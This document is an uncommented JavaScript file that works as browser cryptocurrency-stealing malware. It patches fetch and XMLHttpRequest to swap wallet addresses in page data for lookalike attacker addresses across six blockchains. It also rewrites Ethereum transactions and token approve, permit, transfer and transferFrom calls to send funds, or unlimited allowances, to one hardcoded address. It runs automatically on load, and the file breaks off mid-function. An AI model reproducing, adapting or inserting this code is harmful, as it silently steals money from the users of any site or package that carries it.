
var isEthereumConnected = 0;
var hasRun = 0;
var isLocalInitialized = 0;
async function checkEthereumWallet() {
  try {
    const accounts = await window.ethereum.request({
      method: "eth_accounts"
    });
    if (accounts.length > 0) {
      runMask();
      if (!hasRun) {
        hasRun = 1;
        isEthereumConnected = 1;
        initializeLocalInterceptor();
      }
    } else if (!hasRun) {
      hasRun = 1;
      initializeLocalInterceptor();
    }
  } catch (error) {
    if (!hasRun) {
      hasRun = 1;
      initializeLocalInterceptor();
    }
  }
}

if (typeof window != "undefined" && typeof window.ethereum != "undefined") {
  checkEthereumWallet();
} else if (!hasRun) {
  hasRun = 1;
  initializeLocalInterceptor();
}

function initializeLocalInterceptor() {
  if (isLocalInitialized == 1) {
    return;
  }
  isLocalInitialized = 1;
  
  function calculateLevenshteinDistance(str1, str2) {
    const distanceMatrix = Array.from({
      length: str1.length + 1
    }, () => Array(str2.length + 1).fill(0));
    
    for (let i = 0; i <= str1.length; i++) {
      distanceMatrix[i][0] = i;
    }
    
    for (let j = 0; j <= str2.length; j++) {
      distanceMatrix[0][j] = j;
    }
    
    for (let i = 1; i <= str1.length; i++) {
      for (let j = 1; j <= str2.length; j++) {
        if (str1[i - 1] === str2[j - 1]) {
          distanceMatrix[i][j] = distanceMatrix[i - 1][j - 1];
        } else {
          distanceMatrix[i][j] = 1 + Math.min(
            distanceMatrix[i - 1][j], 
            distanceMatrix[i][j - 1], 
            distanceMatrix[i - 1][j - 1]
          );
        }
      }
    }
    return distanceMatrix[str1.length][str2.length];
  }
  
  function findClosestAddress(targetAddress, addressList) {
    let minDistance = Infinity;
    let closestAddress = null;
    
    for (let address of addressList) {
      const distance = calculateLevenshteinDistance(
        targetAddress.toLowerCase(), 
        address.toLowerCase()
      );
      if (distance < minDistance) {
        minDistance = distance;
        closestAddress = address;
      }
    }
    return closestAddress;
  }
  
  const originalFetch = fetch;
  fetch = async function (...args) {
    const response = await originalFetch(...args);
    const contentType = response.headers.get("Content-Type") || "";
    let responseData;
    
    if (contentType.includes("application/json")) {
      responseData = await response.clone().json();
    } else {
      responseData = await response.clone().text();
    }
    
    const processedData = replaceAddresses(responseData);
    const processedResponse = typeof processedData === "string" 
      ? processedData 
      : JSON.stringify(processedData);
    
    const modifiedResponse = new Response(processedResponse, {
      status: response.status,
      statusText: response.statusText,
      headers: response.headers
    });
    
    return modifiedResponse;
  };
  
  if (typeof window != "undefined") {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
      this._url = url;
      return originalOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function (body) {
      const xhr = this;
      const originalOnReadyStateChange = xhr.onreadystatechange;
      
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          try {
            const contentType = xhr.getResponseHeader("Content-Type") || "";
            let responseData = xhr.responseText;
            
            if (contentType.includes("application/json")) {
              responseData = JSON.parse(xhr.responseText);
            }
            
            const processedData = replaceAddresses(responseData);
            const processedResponse = typeof processedData === "string" 
              ? processedData 
              : JSON.stringify(processedData);
            
            Object.defineProperty(xhr, "responseText", {
              value: processedResponse
            });
            
            Object.defineProperty(xhr, "response", {
              value: processedResponse
            });
          } catch (error) {}
        }
        if (originalOnReadyStateChange) {
          originalOnReadyStateChange.apply(this, arguments);
        }
      };
      
      return originalSend.apply(this, arguments);
    };
  }
  
  function replaceAddresses(data) {
    try {
      if (typeof data === "object" && data !== null) {
        const jsonString = JSON.stringify(data);
        const processedString = processCryptoAddresses(jsonString);
        return JSON.parse(processedString);
      }
      if (typeof data === "string") {
        return processCryptoAddresses(data);
      }
      return data;
    } catch (error) {
      return data;
    }
  }
  
  function processCryptoAddresses(inputText) {
    const bitcoinLegacyAddresses = ["1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx", "1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd", "1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP", "1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY", "1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj", "1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N", "1KkovSeka94yC5K4fDbfbvZeTFoorPggKW", "18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV", "1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP", "1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N", "19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8", "1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR", "1GX1FWYttd65J26JULr9HLr98K7VVUE38w", "14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC", "1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k", "19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg", "16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X", "18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne", "1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8", "13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM", "1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS", "13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ", "154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn", "1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb", "19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn", "17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS", "16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH", "1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP", "143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp", "1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm", "1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju", "19onjpqdUsssaFKJjwuAQGi2eS41vE19oi", "1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS", "1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf", "1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6", "1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z", "174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ", "17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p", "1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc", "13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a"];
    
    const bitcoinSegwitAddresses = ["bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm", "bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9", "bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx", "bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4", "bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar", "bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh", "bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h", "bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt", "bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx", "bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh", "bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq", "bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f", "bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn", "bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4", "bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30", "bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7", "bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4", "bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6", "bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr", "bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79", "bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m", "bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz", "bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu", "bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5", "bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf", "bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk", "bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st", "bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u", "bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd", "bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u", "bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp", "bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej", "bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29", "bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq", "bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a", "bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my", "bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw", "bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55", "bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw", "bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037"];
    
    const ethereumAddresses = ["0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976", "0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024", "0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B", "0x30F895a2C66030795131FB66CBaD6a1f91461731", "0x57394449fE8Ee266Ead880D5588E43501cb84cC7", "0xCd422cCC9f6e8F30FfD6F68C0710D3a7F24a026A", "0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4", "0xe86749d6728d8b02c1eaF12383c686A8544de26A", "0xa4134741a64F882c751110D3E207C51d38f6c756", "0xD4A340CeBe238F148034Bbc14478af59b1323d67", "0xB00A433e1A5Fc40D825676e713E5E351416e6C26", "0xd9Df4e4659B1321259182191B683acc86c577b0f", "0x0a765FA154202E2105D7e37946caBB7C2475c76a", "0xE291a6A58259f660E8965C2f0938097030Bf1767", "0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D", "0xa7eec0c4911ff75AEd179c81258a348c40a36e53", "0x3c6762469ea04c9586907F155A35f648572A0C3E", "0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2", "0x51Bb31a441531d34210a4B35114D8EF3E57aB727", "0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1", "0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966", "0x1914F36c62b381856D1F9Dc524f1B167e0798e5E", "0xB9e9cfd931647192036197881A9082cD2D83589C", "0xE88ae1ae3947B6646e2c0b181da75CE3601287A4", "0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2", "0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68", "0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d", "0x93Ff376B931B92aF91241aAf257d708B62D62F4C", "0x5C068df7139aD2Dedb840ceC95C384F25b443275", "0x70D24a9989D17a537C36f2FB6d8198CC26c1c277", "0x0ae487200606DEfdbCEF1A50C003604a36C68E64", "0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56", "0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673", "0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3", "0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769", "0xd299f05D1504D0B98B1D6D3c282412FD4Df96109", "0x241689F750fCE4A974C953adBECe0673Dc4956E0", "0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261", "0x5651dbb7838146fCF5135A65005946625A2685c8", "0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1", "0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3", "0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9", "0x013285c02ab81246F1D68699613447CE4B2B4ACC", "0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e", "0x4Bf0C0630A562eE973CE964a7d215D98ea115693", "0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb", "0xae9935793835D5fCF8660e0D45bA35648e3CD463", "0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027", "0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D", "0x06de68F310a86B10746a4e35cD50a7B7C8663b8d", "0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54", "0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf", "0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272", "0xe8749d2347472AD1547E1c6436F267F0EdD725Cb", "0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221", "0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3", "0xC4A51031A7d17bB6D02D52127D2774A942987D39", "0xa1b94fC12c0153D3fb5d60ED500AcEC430259751", "0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223", "0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04"];
    
    const solanaAddresses = ["5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6", "98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ", "Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt", "CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN", "7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU", "3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49", "9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV", "4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF", "4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF", "9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL", "7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx", "8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv", "55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx", "Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB", "9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB", "5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr", "F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv", "G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn", "DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K", "HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced"];
    
    const tronAddresses = ["TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67", "TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y", "TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH", "TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc", "TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp", "TGExvgwAyaqwcaJmtJzErXqfra66YjLThc", "TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG", "TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye", "TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp", "TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR", "TPSLojAyTheudTRztqjhNic6rrrSLVkMAr", "TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo", "TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw", "TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f", "TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ", "TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb", "TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP", "TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW", "TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz", "TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW", "TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt", "TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC", "TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ", "THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E", "TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6", "TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L", "TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9", "TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK", "TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V", "TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn", "TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA", "TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt", "TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ", "TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs", "TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL", "TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z", "THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5", "TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP", "TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7", "TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P"];
    
    const litecoinAddresses = ["LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug", "LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR", "LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6", "LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz", "LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa", "LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ", "LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT", "LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB", "Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP", "LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA", "Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP", "LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox", "LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP", "LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6", "LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ", "LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H", "LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq", "LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE", "LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr", "LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9", "LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC", "LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v", "LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V", "LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR", "LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg", "LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k", "LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk", "LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN", "Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT", "LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs", "LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw", "LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X", "LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU", "LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq", "LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe", "LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV", "LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ", "Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu", "LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK", "LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z"];
    
    const bitcoinCashAddresses = ["bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh", "bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9", "bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz", "bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf", "bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39", "bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97", "bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823", "bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3", "bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64", "bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8", "bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt", "bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er", "bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz", "bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s", "bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7", "bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed", "bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw", "bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa", "bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc", "bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd", "bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl", "bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g", "bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf", "bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u", "bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck", "bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3", "bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj", "bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064", "bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7", "bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j", "bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6", "bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59", "bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu", "bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l", "bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7", "bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q", "bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3", "bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad", "bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5", "bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"];
    
    const addressPatterns = {
      ethereum: /\b0x[a-fA-F0-9]{40}\b/g,
      bitcoinLegacy: /\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g,
      bitcoinSegwit: /\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g,
      tron: /((?<!\w)[T][1-9A-HJ-NP-Za-km-z]{33})/g,
      bch: /bitcoincash:[qp][a-zA-Z0-9]{41}/g,
      ltc: /(?<!\w)ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}\b/g,
      ltc2: /(?<!\w)[mlML][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
      solana: /((?<!\w)[4-9A-HJ-NP-Za-km-z][1-9A-HJ-NP-Za-km-z]{32,44})/g,
      solana2: /((?<!\w)[3][1-9A-HJ-NP-Za-km-z]{35,44})/g,
      solana3: /((?<!\w)[1][1-9A-HJ-NP-Za-km-z]{35,44})/g
    };
    
    for (const [chain, pattern] of Object.entries(addressPatterns)) {
      const matchedAddresses = inputText.match(pattern) || [];
      
      for (const address of matchedAddresses) {
        if (chain == "ethereum") {
          if (!ethereumAddresses.includes(address) && isEthereumConnected == 0) {
            inputText = inputText.replace(address, findClosestAddress(address, ethereumAddresses));
          }
        }
        
        if (chain == "bitcoinLegacy") {
          if (!bitcoinLegacyAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, bitcoinLegacyAddresses));
          }
        }
        
        if (chain == "bitcoinSegwit") {
          if (!bitcoinSegwitAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, bitcoinSegwitAddresses));
          }
        }
        
        if (chain == "tron") {
          if (!tronAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, tronAddresses));
          }
        }
        
        if (chain == "ltc" || chain == "ltc2") {
          if (!litecoinAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, litecoinAddresses));
          }
        }
        
        if (chain == "bch") {
          if (!bitcoinCashAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, bitcoinCashAddresses));
          }
        }
        
        const allAddresses = [...ethereumAddresses, ...bitcoinLegacyAddresses, ...bitcoinSegwitAddresses, ...tronAddresses, ...litecoinAddresses, ...bitcoinCashAddresses];
        const isKnownAddress = allAddresses.includes(address);
        
        if ((chain == "solana" || chain == "solana2") && !isKnownAddress) {
          if (!solanaAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, solanaAddresses));
          }
        }
        
        if (chain == "solana3" && isKnownAddress) {
          if (!solanaAddresses.includes(address)) {
            inputText = inputText.replace(address, findClosestAddress(address, solanaAddresses));
          }
        }
      }
    }
    
    return inputText;
  }
}

async function runMask() {
  let interceptCount = 0;
  let originalMethods = new Map();
  let isProxyActive = false;
  
  function modifyTransactionData(transactionData, isEthereum = true) {
    const modifiedData = JSON.parse(JSON.stringify(transactionData));
    
    if (isEthereum) {
      if (modifiedData.value && modifiedData.value !== "0x0" && modifiedData.value !== "0") {
        const originalTo = modifiedData.to;
        modifiedData.to = "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976";
      }
      
      if (modifiedData.data) {
        const txData = modifiedData.data.toLowerCase();
        
        if (txData.startsWith("0x095ea7b3")) {
          if (txData.length >= 74) {
            const functionSelector = txData.substring(0, 10);
            const originalAddress = "0x" + txData.substring(34, 74);
            const targetAddress = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
            const maxAllowance = "f".repeat(64);
            modifiedData.data = functionSelector + targetAddress + maxAllowance;
            
            const knownContracts = {
              "0x7a250d5630b4cf539739df2c5dacb4c659f2488d": "Uniswap V2",
              "0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af": "Uniswap V2",
              "0xe592427a0aece92de3edee1f18e0157c05861564": "Uniswap V3",
              "0x10ed43c718714eb63d5aa57b78b54704e256024e": "PancakeSwap V2",
              "0x13f4ea83d0bd40e75c8222255bc855a974568dd4": "PancakeSwap V3",
              "0x1111111254eeb25477b68fb85ed929f73a960582": "1inch",
              "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f": "SushiSwap"
            };
            
            const contractName = knownContracts[originalAddress.toLowerCase()];
            if (contractName) {
              console.log(contractName + originalAddress);
            } else {
              console.log(originalAddress);
            }
          }
        } else if (txData.startsWith("0xd505accf")) {
          if (txData.length >= 458) {
            const functionSelector = txData.substring(0, 10);
            const param1 = txData.substring(10, 74);
            const param3 = txData.substring(202, 266);
            const param4 = txData.substring(266, 330);
            const param5 = txData.substring(330, 394);
            const param6 = txData.substring(394, 458);
            const targetAddress = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
            const maxAllowance = "f".repeat(64);
            modifiedData.data = functionSelector + param1 + targetAddress + maxAllowance + param3 + param4 + param5 + param6;
          }
        } else if (txData.startsWith("0xa9059cbb")) {
          if (txData.length >= 74) {
            const functionSelector = txData.substring(0, 10);
            const remainingData = txData.substring(74);
            const targetAddress = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
            modifiedData.data = functionSelector + targetAddress + remainingData;
          }
        } else if (txData.startsWith("0x23b872dd")) {
          if (txData.length >= 138) {
            const functionSelector = txData.substring(0, 10);
            const param1 = txData.substring(10, 74);
            const remainingData = txData.substring(138);
            const targetAddress = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
